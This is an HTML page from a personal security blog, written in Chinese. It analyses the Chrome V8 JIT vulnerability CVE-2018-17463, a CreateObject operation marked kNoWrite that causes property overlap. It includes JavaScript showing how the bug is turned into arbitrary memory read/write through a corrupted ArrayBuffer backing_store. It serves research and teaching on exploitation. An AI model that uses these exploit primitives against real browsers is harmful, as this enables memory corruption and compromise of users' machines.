@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>Chrome Js engine attack analysis | Peterpan0927&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="learning for js engine vulnerabilities">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chrome Js engine attack analysis">
+<meta property="og:url" content="https://peterpan980927.cn/2019/08/08/Chrome引擎漏洞分析及利用/index.html">
+<meta property="og:site_name" content="Peterpan0927&#39;s Blog">
+<meta property="og:description" content="learning for js engine vulnerabilities">
+<meta property="og:locale" content="English">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g5sfsvim1gj30w613owmb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g5sgj3uqibj30ou0gogwp.jpg">
+<meta property="og:updated_time" content="2019-08-09T07:18:45.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Chrome Js engine attack analysis">
+<meta name="twitter:description" content="learning for js engine vulnerabilities">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006y1smsly1g5sfsvim1gj30w613owmb.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Peterpan0927&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/p1.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://pbs.twimg.com/profile_images/1096645032407269376/9cO9fRMm_400x400.png">
+    <h2 class="author">Peterpan0927</h2>
+    <h3 class="description">how to reach the steins gate?</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-Chrome引擎漏洞分析及利用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/08/Chrome引擎漏洞分析及利用/" class="article-date">
+  <time class="post-time" datetime="2019-08-08T11:00:01.000Z" itemprop="datePublished">
+    <span class="post-month">8月</span><br/>
+    <span class="post-day">08</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Chrome Js engine attack analysis
+    </h1>
+  
+
+        <div>
+          
+          
+              
+  &nbsp; | &nbsp;
+  <div class="view-box">
+    <span id="/2019/08/08/Chrome引擎漏洞分析及利用/" class="leancloud_visitors" data-flag-title="Chrome Js engine attack analysis">
+      &nbsp;阅读次数<span class="leancloud-visitors-count"></span>
+    </span>
+  </div>
+
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>learning for js engine vulnerabilities</p>
+<a id="more"></a>
+<h1 id="Chrome引擎漏洞分析及利用"><a href="#Chrome引擎漏洞分析及利用" class="headerlink" title="Chrome引擎漏洞分析及利用"></a>Chrome引擎漏洞分析及利用</h1><p>漏洞编号：<code>CVE-2018-17463</code>,在chrome 70版本中被patch，测试版本为69.0.3497.42 beta版，涉及的一些前置知识可以参考V8的内存布局和官方文档</p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>V8的<code>IR</code>层操作有很多的<code>flag</code>，其中有一个<code>flag</code>叫做<code>kNowrite</code>，从简单的语义分析来看表示的就是没有进行写操作，事实上代表的意思就是拥有这个<code>flag</code>的操作不会修改原有的属性，那么也就是说<code>js engine</code>推测含有这个<code>flag</code>的操作是可以进行一些深度优化的，比如说去掉它的类型检查：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_OP_LIST(V)                                            </span></span><br><span class="line">      ...                                                               </span><br><span class="line">      V(CreateObject, Operator::kNoWrite, <span class="number">1</span>, <span class="number">1</span>)                          </span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>
+<p>但是事实并非如此，通过跟踪这个的底层调用我们可以发现一些问题，在<code>JSCreateObject</code>函数中，通过跟踪调用可以发现最后调到了一个名为 <code>JSObject::OptimizeAsPrototype</code>的函数上面，而这个函数可能会修改对象原型，了解JS的可以知道所谓的原型代表的其实是一种类似类的继承关系，也就是说这个操作会修改对象的类型，也就是<code>Map</code>属性，通过<code>runtime func</code>也可以确定(<code>%DebugPrint</code>)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o.inline;</span><br><span class="line"><span class="built_in">Object</span>.create(o);</span><br><span class="line"><span class="comment">//经过create之后o的map会变，并且从FastProperties变成DictionaryProperties</span></span><br></pre></td></tr></table></figure>
+<p>这样一来对象<code>o</code>的内存属性布局也会随之改变，如果经过了优化之后的代码去掉了<code>checkMap</code>节点的话，那么之后对于对象属性的访问就会按照之前的内存布局进行访问，举一个很简单的例子，可能在<code>FastProperties</code>的时候想要访问属性编译成机器码之后如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;js code : return o.b</span><br><span class="line">r1 = Load [o + 0x8]</span><br><span class="line">r2 = Load [r1 + 0x10]</span><br><span class="line">Return r2</span><br></pre></td></tr></table></figure>
+<p>但是此时作为<code>DictionaryProperties</code>的内存布局在对应偏移的位置就可能不是原来的数据了，而是其他未知的数据，在分析<code>create</code>操作前后的内存布局我们可以发现一个奇怪的事情：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">o.p0 = <span class="number">0</span>; o.p1 = <span class="number">1</span>; o.p2 = <span class="number">2</span>; o.p3 = <span class="number">3</span>; o.p4 = <span class="number">4</span>;</span><br><span class="line">o.p5 = <span class="number">5</span>; o.p6 = <span class="number">6</span>; o.p7 = <span class="number">7</span>; o.p8 = <span class="number">8</span>; o.p9 = <span class="number">9</span>;</span><br><span class="line">   <span class="number">0x0000130c92483e89</span>         <span class="number">0x0000130c92483bb1</span></span><br><span class="line">   <span class="number">0x0000000c00000000</span>         <span class="number">0x0000006500000000</span></span><br><span class="line">   <span class="number">0x0000000000000000</span>         <span class="number">0x0000000b00000000</span></span><br><span class="line">   <span class="number">0x0000000100000000</span>         <span class="number">0x0000000000000000</span></span><br><span class="line">   <span class="number">0x0000000200000000</span>         <span class="number">0x0000002000000000</span></span><br><span class="line">   <span class="number">0x0000000300000000</span>         <span class="number">0x0000000c00000000</span></span><br><span class="line">   <span class="number">0x0000000400000000</span>         <span class="number">0x0000000000000000</span></span><br><span class="line">   <span class="number">0x0000000500000000</span>         <span class="number">0x0000130ce98a4341</span></span><br><span class="line">   <span class="number">0x0000000600000000</span> overlap <span class="number">0x0000000200000000</span></span><br><span class="line">   <span class="number">0x0000000700000000</span>         <span class="number">0x000004c000000000</span></span><br><span class="line">   <span class="number">0x0000000800000000</span>         <span class="number">0x0000130c924826f1</span></span><br><span class="line">   <span class="number">0x0000000900000000</span>         <span class="number">0x0000130c924826f1</span></span><br></pre></td></tr></table></figure>
+<p>那就是<code>o.p6</code>和<code>o.p2</code>这两个属性经过转换之后发生了重叠，这意味着我们在优化去掉了<code>checkMap</code>节点之后访问<code>o.p6</code>，实际上返回的是<code>o.p2</code>的值。</p>
+<p>稍微对于<code>V8</code>的一些机制有了解的话就知道<code>DictionaryMode</code>是通过<code>hashfunc</code>来计算地址的，所以这个<code>overlap</code>是哈希之后的结果，而这个哈希计算的方式是进程独立的，也就是我们每个进程都有着不同的哈希计算方式，这也就意味着我们如果找到了这个<code>overlap</code>，之后就可以通过修改<code>o.p2</code>来做到很多事情，比如说在<code>o.p2</code>放置一个对象，那么返回的就是这个对象的地址了。</p>
+<h2 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h2><p>这里的任意地址读写用的是两个<code>ArrayBuffer</code>，首先来看看普通对象和<code>ArrayBuffer</code>内存布局的对比：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g5sfsvim1gj30w613owmb.jpg" alt></p>
+<p>上面的是<code>ArrayBuffer</code>，下面是普通对象，可以看到<code>backing_store</code>的偏移应该是对应的是普通对象的第二个<code>inline</code>属性的偏移，所以如果我们在触发漏洞后，将对象的第二个对象内属性修改，就可以把这个<code>backing_store</code>的值给修改，如果我们修改为指向另一个<code>ArrayBuffer</code>，形成如下的结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+           +-----------------+</span><br><span class="line">  |  ArrayBuffer 1  |     +----&gt;|  ArrayBuffer 2  |</span><br><span class="line">  |                 |     |     |                 |</span><br><span class="line">  |  map            |     |     |  map            |</span><br><span class="line">  |  properties     |     |     |  properties     |</span><br><span class="line">  |  elements       |     |     |  elements       |</span><br><span class="line">  |  byteLength     |     |     |  byteLength     |</span><br><span class="line">  |  backingStore --+-----+     |  backingStore   |</span><br><span class="line">  |  flags          |           |  flags          |</span><br><span class="line">  +-----------------+           +-----------------+</span><br></pre></td></tr></table></figure>
+<p>那么我们用第一个ArrayBuffer来new一个<code>BigUint64</code>的数组，这个数组的地址事实上是<code>ArrayBuffer</code>的数据，也就是<code>backing_store</code>指向的<code>ArrayBuffer2</code>，我们将数组的第五个元素，也就是<code>backing_store</code>进行任意的设置可以指向任意的地址，然后切换到<code>ArrayBuffer2</code>进行操作，再用<code>ArrayBuffer2</code>来new一个新的数组，这个时候我们对数组进行的任何操作都是我们对于那个地址的任何操作，也就是所谓的任意地址读写了，稍微封装一下如下所示：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//driver是ArrayBuffer2 </span></span><br><span class="line"><span class="keyword">let</span> memory = &#123;</span><br><span class="line">  			<span class="comment">//任意地址写就是setvalue</span></span><br><span class="line">        write(addr, bytes) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(memViewBuf);</span><br><span class="line">            memview.set(bytes);</span><br><span class="line">        &#125;,</span><br><span class="line">  			<span class="comment">//任意地址读就是返回数组的值</span></span><br><span class="line">        read(addr, len) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(memViewBuf);</span><br><span class="line">            <span class="keyword">return</span> memview.subarray(<span class="number">0</span>, len);</span><br><span class="line">        &#125;,</span><br><span class="line">        read64(addr) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> BigUint64Array(memViewBuf);</span><br><span class="line">            <span class="keyword">return</span> memview[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line">        write64(addr, ptr) &#123;</span><br><span class="line">            driver[<span class="number">4</span>] = addr;</span><br><span class="line">            <span class="keyword">let</span> memview = <span class="keyword">new</span> BigUint64Array(memViewBuf);</span><br><span class="line">            memview[<span class="number">0</span>] = ptr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>这里只用一个<code>ArrayBuffer</code>行不行呢？其实也是可以的，只不过每一次修改都用通过优化并触发漏洞来<code>overlap</code>掉<code>backing_store</code>，而两个<code>ArrayBuffer</code>就只需要触发一次，可以节省很多开销并更加稳定</p>
+<p>最后来看一下任意地址读的效果图，是在macOS上测试的：</p>
+<p><img src="https://ws1.sinaimg.cn/large/006y1smsly1g5sgj3uqibj30ou0gogwp.jpg" alt></p>
+<p>之后的工作还有待完善，可以完全控制浏览器的控制流</p>
+<h1 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h1><p><a href="http://phrack.org/papers/jit_exploitation.html" target="_blank" rel="noopener">phrack</a></p>
+<p><a href="https://github.com/saelo" target="_blank" rel="noopener">saleo</a></p>
+<p><a href="https://peterpan0927.github.io/2019/07/08/JavaScript-in-V8/#more" target="_blank" rel="noopener">js engine</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://peterpan980927.cn/2019/08/08/Chrome引擎漏洞分析及利用/" data-id="ck6uoaobu0001pbpkfnkz64kz" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/20/local-DOS-on-latest-macOS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          local DOS on latest macOS
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/07/23/iOS12-2越狱漏洞分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">iOS12.2 jailbreak analysis</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Peterpan0927&#39;s Blog</h1>
+    <h2 class="blog-subtitle">Mind over muscle.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://pbs.twimg.com/profile_images/1096645032407269376/9cO9fRMm_400x400.png">
+    <h2 class="author">Peterpan0927</h2>
+    <h3 class="description">how to reach the steins gate?</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>3</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/Peterpan0927" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>Links</h2>
+      
+        <a class="hvr-bounce-in" href="https://www.imbajin.com" target="_blank" title="Jin">
+          Jin
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://yinwang0.wordpress.com" target="_blank" title="Yinwang(English)">
+          Yinwang(English)
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://www.yinwang.org" target="_blank" title="Yinwang(Chinese)">
+          Yinwang(Chinese)
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://gloxec.github.io/" target="_blank" title="gloxec">
+          gloxec
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2019 - 2020 Peterpan0927<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">HomePage</a>
+          
+            <a href="/tags" title="" class="menuItem">Tag</a>
+          
+            <a href="/about" title="" class="menuItem">About</a>
+          
+            <a href="/archives" title="" class="menuItem">Archives</a>
+          
+            <a href="https://github.com/Peterpan0927" title="" class="menuItem">Github</a>
+          
+            <a href="ftp://118.89.38.168" title="" class="menuItem">FTP</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz", "xDGMWtxNt0aReJDVkuYmSqBd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.article-title').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+  </div>
+</body>
+</html>
